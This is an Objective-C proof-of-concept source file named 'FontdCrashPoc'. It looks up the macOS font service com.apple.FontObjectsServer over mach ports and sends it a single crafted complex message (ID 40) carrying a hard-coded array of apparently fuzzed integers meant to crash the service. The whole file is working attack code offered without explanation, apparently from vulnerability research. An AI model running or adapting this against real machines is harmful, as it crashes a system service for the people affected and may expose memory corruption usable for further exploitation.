//
//  main.m
//  FontdCrashPoc
//
//  Created by lilang_wu on 2018/3/27.
//  Copyright © 2018年 lilang_wu. All rights reserved.
//

#import <Foundation/Foundation.h>
#import <xpc/xpc.h>
#import <mach/message.h>

struct mach_msg_send {
    mach_msg_header_t hdr;
    int body[255];
};


int main(int argc, const char * argv[]) {
    @autoreleasepool {
        mach_port_t bootstrap_port = 0;
        mach_port_t service_port = 0;
        kern_return_t err = task_get_bootstrap_port(mach_task_self(), &bootstrap_port);
        if (err != KERN_SUCCESS) {
            printf(" [-] couldn't get bootstrap port\n");
        }
        printf(" [+] got bootstrap port 0x%ullx\n", bootstrap_port);
        char* service_name = "com.apple.FontObjectsServer";
        err = bootstrap_look_up(bootstrap_port, service_name, &service_port); //
        if (err != KERN_SUCCESS) {
            printf(" [-] unable to lookup service %s\n", service_name);
            service_port = 0;
        }
        printf(" [+] got %s mach port 0x%llx\n", service_name, service_port);
        
        struct mach_msg_send* msg_send = malloc(sizeof(struct mach_msg_send));
        memset(msg_send, 0, sizeof(struct mach_msg_send));
        
        msg_send->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
        msg_send->hdr.msgh_bits = msg_send->hdr.msgh_bits | MACH_MSGH_BITS_COMPLEX;
        msg_send->hdr.msgh_size = sizeof(struct mach_msg_send);
        msg_send->hdr.msgh_remote_port = service_port;
        msg_send->hdr.msgh_local_port = MACH_PORT_NULL;
        msg_send->hdr.msgh_id = 40;
        
        int data[] = {0, 0, 3672566, 0, 0, 0, 0, 0, -1643708172, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 131833576, 0, 1694160613, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -12129211, 0, 0, 0, 0, 0, 0, 0    , 1043942300, 0, 0, 0, 0, 0, -1674127321, 0, 0, 0, 0, 0, 0, 0, -1529795889, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1246614885, 0, 0, 0, 0, 429475552, 0, 0, 1836666124, 0, 0, 0, -810389945, 0, 0, 0, 0, 0,     0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -621814819, 0, 0, 0, 0, 1215485781, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 275919961, 1860060606, 0, 0, 0, 0, 0, 0, 0, 0, 0, -243901458, 0, 0, 0, 0, 0,     0, 0, 0, 0, 0, 0, 0, -2029832983, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 2249648, 0, 0, 0, 0, 0, -689119648, 0, 0, 0, 0, 0, 0, 0, 0, 0,     1821055003, 0, 0, 0, 0, 0, 0, 0, -625988527, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 312683147, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,     1369341658, 0};
        
        for (int i = 0; i < sizeof(data)/sizeof(data[0]); i++) {
            msg_send->body[i] = data[i];
        }
        
        
        mach_msg(&msg_send->hdr, MACH_SEND_MSG, msg_send->hdr.msgh_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
        
    }
    return 0;
}
